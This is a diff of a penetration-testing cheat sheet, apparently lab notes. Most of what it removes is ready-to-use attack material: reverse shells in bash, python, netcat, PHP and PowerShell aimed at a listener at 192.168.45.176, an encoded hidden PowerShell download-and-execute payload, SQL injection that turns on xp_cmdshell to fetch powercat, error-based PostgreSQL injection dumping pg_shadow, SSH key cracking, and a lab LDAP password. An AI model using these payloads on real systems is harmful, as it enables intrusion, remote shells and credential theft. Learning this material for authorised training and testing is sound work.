@@ -462,7 +462,6 @@ exiftool -a -u brochure.pdf
 ```bash
 crackmapexec smb 192.168.216.165 -u 'enox' -p '' --shares
 crackmapexec smb <% ["RHOST"] %> -u "" -p "" --pass-pol
-
 ```
 
 ## smbclient
@@ -481,106 +480,6 @@ smbclient //10.129.193.5/Users -U active.htb/svc_tgs
 > tarmode
 ```
 
-## smbserver
-```bash
-sudo smbserver.py -smb2support share $(pwd) 
-sudo smbserver.py -smb2support share $(pwd) -user kali -password kali
-
-```
-
-
-# PORT 389,3268: LDAP
-## ldapsearch: focus on samaccount and description
-```bash
-# unauthenticated
-ldapsearch -x -H ldap://192.168.216.122 -D 'hutch.offsec' -s base namingcontexts
-ldapsearch -x -H ldap://192.168.216.122 -D 'hutch.offsec'  -b 'DC=hutch,DC=offsec'
-
-# authenticated(LAPS found from SYSVOL)
-ldapsearch -x -H 'ldap://192.168.216.122' -D 'hutch\fmcsorley' -w 'CrabSharkJellyfish192' -b 'dc=hutch,dc=offsec' "(ms-MCS-AdmPwd=*)" ms-MCS-AdmPwd
-```
-
-# kerbrute
-```bash
-kerbrute.py -users ./users.txt -dc-ip 10.10.10.175 -domain Egotistical-bank.local
-```
-
-# SNMP(161)
-```bash
-snmpwalk -c public -v1 192.168.x.x
-snmpwalk -v2c -c public 192.168.195.149 NET-SNMP-EXTEND-MIB::nsExtendObjects
-```
-
-
-## socat
-```bash
-sudo socat tcp-listen:135,reuseaddr,fork tcp:<victim.ip.add.ress>:9999
-```
-
-## Reverse shell
-```bash
-# bash
-bash -i >& /dev/tcp/192.168.45.176/80 0>&1
-bash -c 'bash -i >& /dev/tcp/192.168.45.176/80 0>&1'
-bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.45.176%2F80%200%3E%261%22
-echo -n '/bin/bash -c "bin/bash -i >& /dev/tcp/192.168.45.176/80 0>&1"' | base64
-
-# python
-python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.45.176",80));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
-
-python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.45.176",80));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
-
-
-#netcat reverse shell
-nc -e /bin/sh 192.168.45.176 80
-
-#PHP reverse shell
-php -r '$sock=fsockopen("192.168.45.176",80);exec("/bin/sh -i <&3 >&3 2>&3");'
-
-
-# Powershell: w powercat
-IEX(New-Object System.Net.Webclient).DownloadString("http://192.168.45.176/powercat.ps1");powercat -c 192.168.45.176 -p 4444 -e powershell
-
-# when executing with base64 encoded
-powershell.exe -nop -w hidden -e SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAGMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAiAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADQANQAuADEANwA2AC8AcABvAHcAZQByAGMAYQB0AC4AcABzADEAIgApADsAcABvAHcAZQByAGMAYQB0ACAALQBjACAAMQA5ADIALgAxADYAOAAuADQANQAuADEANwA2ACAALQBwACAANAA0ADQANAAgAC0AZQAgAHAAbwB3AGUAcgBzAGgAZQBsAGwACgA=
-
-# Powershell: wo powercat
-$client = New-Object System.Net.Sockets.TCPClient('<% tp.frontmatter["LHOST"] %>',<LPORT>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex ". { $data } 2>&1" | Out-String ); $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
-
-powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('<% tp.frontmatter["LHOST"] %>',<LPORT>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
-
-powershell -nop -exec bypass -c '$client = New-Object System.Net.Sockets.TCPClient("<% tp.frontmatter["LHOST"] %>",<LPORT>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'
-
-
-#Powershell: Create powershell reverse shell on kali linux
-$ kali@kali:~$ pwsh
-
-PS> $Text = '$client = New-Object System.Net.Sockets.TCPClient("192.168.119.3",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'
-
-PS> $Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text)
-PS> $EncodedText =[Convert]::ToBase64String($Bytes)
-PS> $EncodedText
-
-$powershell -enc $EncodedText
-
-```
-
-## curl
-```bash
-# GET Request
-curl -i http://192.168.50.16:5002/users/v1/admin/password
-
-# POST Request
-curl -X POST --data 'Archive=git' http://192.168.50.189:8000/archive
-curl -d '{"password":"fake","username":"admin"}' -H 'Content-Type: application/json'  http://192.168.50.16:5002/users/v1/login
-
-# PUT Request
-curl -X 'PUT' \
-  'http://192.168.50.16:5002/users/v1/admin/password' \
-  -H 'Content-Type: application/json' \
-  -H 'Authorization: OAuth eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE2NDkyNzE3OTQsImlhdCI6MTY0OTI3MTQ5NCwic3ViIjoib2Zmc2VjIn0.OeZH1rEcrZ5F0QqLb8IHbJI7f9KaRAkrywoaRUAsgA4' \
-  -d '{"password": "pwned"}'
-```
 
 ## File Download(When not working, make sure to use 80 and also try it without http://)
 ```bash
@@ -615,13 +514,6 @@ Your public key has been saved in fileup.pub
 kali@kali:~$ cat fileup.pub > authorized_keys
 ```
 
-## SSH Crack Paraphrase
-```bash
-$ ssh2john anita_id_rsa > ssh_key
-$ hashcat -m 22911 ./ssh_key /usr/share/wordlists/rockyou.txt --force
-```
-
-
 ## SSH 
 ```bash
 kali@kali:~/passwordattacks$ ssh2john id_rsa > ssh.hash
@@ -642,51 +534,6 @@ kali@kali: hashcat -m 22921 ssh.hash /usr/share/wordlists/rockyou.txt --force
 - /etc/shadow
 - /home/username/.bash_history
 - /home/username/.bash_aliases
-
-# SQLi
-## mssql
-```bash
-';EXEC sp_configure 'show advanced options', 1;--
-';RECONFIGURE;--
-';EXEC sp_configure "xp_cmdshell", 1;--
-';RECONFIGURE;--
-';EXEC xp_cmdshell 'powershell.exe -nop -w hidden -c "IEX ((New-Object Net.WebClient).DownloadString(''http://192.168.45.176/powercat.ps1''))"; powercat -c 192.168.45.176 -p 4444 -e powershell'; --
-
-
-or
-sudo Responder -I tun0 -A
-';EXEC xp_dirtree \\192.168.45.176\share
-```
-
-## postgresql
-```bash
-' order by 7 -- //
-' union select 1, 1, 1, 1, 1, 1 -- //
-' union select 'd', 1, 1, 'd', 'd', null -- //
-
-# Current user
-' union select 'd', cast((SELECT concat('DATABASE: ',current_user)) as int), 1, 'd', 'd', null -- //
-
-# Use cast to cause error to get the database
-' union select 'd', cast((SELECT concat('DATABASE: ',current_database())) as int), 1, 'd', 'd', null -- //
-## ERROR
-<b>Warning</b>:  pg_query(): Query failed: ERROR:  invalid input syntax for type integer: &quot;DATABASE: glovedb&quot; in <b>/var/www/html/class.php</b> on line <b>423</b><br />
-
-# Use case to find out tables
-cast((SELECT table_name FROM information_schema.tables LIMIT 1 OFFSET data_offset) as int)
-
-
-# Use cast to find out columns for each table
-cast((SELECT column_name FROM information_schema.columns WHERE table_name='data_table' LIMIT 1 OFFSET data_offset) as int)
-
-
-# Use cast to find out row for each column
-cast((SELECT data_column FROM data_table LIMIT 1 OFFSET data_offset) as int)
-
-
-# Get current user's password!
-' union select 'd', cast((SELECT concat('DATABASE: ',passwd) FROM pg_shadow limit 1 offset 1) as int), 1, 'd', 'd', null -- //
-```
 
 ## **CVE-2019–9193**
 ```bash
